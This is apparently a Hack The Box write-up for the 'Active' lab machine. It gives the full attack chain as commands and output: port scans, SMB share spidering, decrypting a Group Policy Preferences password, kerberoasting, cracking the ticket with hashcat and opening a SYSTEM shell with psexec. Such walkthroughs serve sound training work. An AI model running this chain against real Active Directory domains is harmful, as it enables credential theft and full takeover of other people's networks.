---
title: "HTB Active Writeup"
description: In this box, we take advantage of exposed GPP. With the creds, perform kerberoasting. We are able to crack the TGS we kerberoasted, which is an administrator account. Using ps-exec, we can get a SYSTEM shell.
date: 2026-02-24T04:04:51-05:00
image: 
tags:
    - HTB
categories:
    - htb-writeups
comments: false
---

## Port Scan
1. TCP Port Scan
```sh
sudo nmap -Pn 10.129.192.153 -sS  -p- --min-rate 20000 -oN nmap/allTcpPortScan.nmap
```
Output:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 18:26 EST
Warning: 10.129.192.153 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.192.153
Host is up (0.035s latency).
Not shown: 59657 closed tcp ports (reset), 5855 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49169/tcp open  unknown
49171/tcp open  unknown
49177/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 16.80 seconds
```
2. Script and Version Scan
```sh
sudo nmap -Pn 10.129.192.153 -sCV  -p53,88,135,139,445,464,593,636,3268,3269,5722,9389,47001 --min-rate 20000 -oN nmap/scriptVersionScan.nmap
```
Output:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 18:30 EST
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 92.31% done; ETC: 18:31 (0:00:03 remaining)
Nmap scan report for 10.129.192.153
Host is up (0.014s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-01 23:31:04Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-02-01T23:31:59
|_  start_date: 2026-02-01T23:20:51

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.32 seconds
```
3. UDP Scan
```sh
sudo nmap -Pn 10.129.192.153 -sU  -p- --min-rate 20000 -oN nmap/allTcpPortScan.nmap
```
Output:
```
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp

Nmap done: 1 IP address (1 host up) scanned in 36.70 seconds
```
## AD Research
1. I set up a Responder listener to listen for incoming connections.
```sh
sudo responder -I tun0 -dvw 
```
2. Since RPC and SMB are available, I will run enum4linux
```sh
enum4linux 10.129.192.153 -A -C | tee enum4linux_withrpc.txt
enum4linux 10.129.192.153 -A | tee enum4linux_withrpc.txt
```
Output:
![[Pasted image 20260202074725.png]]
3. To download all the readable SMB shares,
```sh
netexec smb 10.129.192.153 -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
```
Output:
```json
{
    "Replication": {
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "23 B"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "119 B"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "1.07 KB"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "533 B"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "2.72 KB"
        },
        "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "22 B"
        },
        "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "3.63 KB"
        }
    }
} 
```
4. There is an interesting `Groups.xml` file
```
cat ./Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```
Output:
```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
- Refer: [[Group Policy Preferences (GPP) Passwords]]
5. We can decrypt with `gpp-decrypt`
```sh
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```
Output:
```
GPPstillStandingStrong2k18
```
6. It is still a valid user account
```sh
netexec smb 10.129.192.153 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' 
```
Output:
```
SMB         10.129.192.153  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.192.153  445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```
7. List shares we can access
```sh
 netexec smb 10.129.192.153 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```
Output:
```
SMB         10.129.192.153  445    DC               Share           Permissions     Remark
SMB         10.129.192.153  445    DC               -----           -----------     ------
SMB         10.129.192.153  445    DC               ADMIN$                          Remote Admin
SMB         10.129.192.153  445    DC               C$                              Default share
SMB         10.129.192.153  445    DC               IPC$                            Remote IPC
SMB         10.129.192.153  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.192.153  445    DC               Replication     READ            
SMB         10.129.192.153  445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.192.153  445    DC               Users           READ       
```
- `spider_plus` is not working
7. We can use SMB to access our file directory and get the flag
```sh
smbclient -U 'active.htb/SVC_TGS' \\\\10.129.192.153\\Users
```
Output:
```
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                           AR       34  Sun Feb  1 18:22:00 2026
```
## LDAP
1. We can dump the contents from LDAP with
```sh
ldapsearch -b "DC=active,DC=htb" -s sub "*" -H ldap://10.129.192.153 -x -LLL -w GPPstillStandingStrong2k18 -D "SVC_TGS" > ldapDump.txt
```
## WMI -> RCE?
1. WMI Exec did not work
```sh
impacket-wmiexec active.htb/SVC_TGS@active.htb -dc-ip 10.129.192.153 -target-ip 10.129.192.153 -debug 
```
Output:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
Password:
[*] SMBv2.1 dialect used
Traceback (most recent call last):
  File "/usr/share/doc/python3-impacket/examples/wmiexec.py", line 96, in run
    iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/dcomrt.py", line 1083, in CoCreateInstanceEx
    iInterface = scm.RemoteCreateInstance(clsid, iid)
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/dcomrt.py", line 1867, in RemoteCreateInstance
    resp = self.__portmap.request(request)
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 861, in request
    answer = self.recv()
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1325, in recv
    raise DCERPCException(rpc_status_codes[status_code])
impacket.dcerpc.v5.rpcrt.DCERPCException: rpc_s_access_denied
[-] rpc_s_access_denied
```
## SMB -> RCE?
1. When I scan with Netexec SMB module, I see this:
```sh
netexec smb 10.129.192.153 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' -M coerce_plus
```
Output:
```
SMB         10.129.192.153  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.192.153  445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
COERCE_PLUS 10.129.192.153  445    DC               VULNERABLE, DFSCoerce
COERCE_PLUS 10.129.192.153  445    DC               VULNERABLE, PetitPotam
COERCE_PLUS 10.129.192.153  445    DC               VULNERABLE, MSEven
```
## Kerberoasting
1. Ok, I cheated a bit again. For some reason, I was so focused on getting a shell on the system but forgot one vector that does not need shell - Kerberoasting!
2. Let's check for Kerberoastable users.
```sh
impacket-GetUserSPNs -dc-ip 10.129.192.153 active.htb/SVC_TGS  
```
Output:
```     
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-02-01 18:22:04.416960  
```
3. We can get the Kerberos Tickets with this command.
```sh
impacket-GetUserSPNs -dc-ip 10.129.192.153 active.htb/SVC_TGS -request -outputfile tgs_tickets
```
4. Let's try to crack the hash
```sh
hashcat -m 13100 tgs_tickets /usr/share/wordlists/rockyou.txt
```
Output:
```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c1<SNIP>45b:Ticketmaster1968
```
5. Let's check our access
```sh
netexec smb 10.129.192.153 -u 'active.htb\Administrator' -p 'Ticketmaster1968' 
```
Output:
```
SMB         10.129.192.153  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.192.153  445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```
6. To get a shell,
```sh
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.129.192.153  
```
Output:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.192.153.....
[*] Found writable share ADMIN$
[*] Uploading file eVdNPlWc.exe
[*] Opening SVCManager on 10.129.192.153.....
[*] Creating service aMmq on 10.129.192.153.....
[*] Starting service aMmq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```
## Review
1. `Groups.xml` is an interesting file
2. We do not need a shell to escalate privileges. Use LDAP to populate BloodHound and SMB/ wsman can be used to get a semi-interactive shell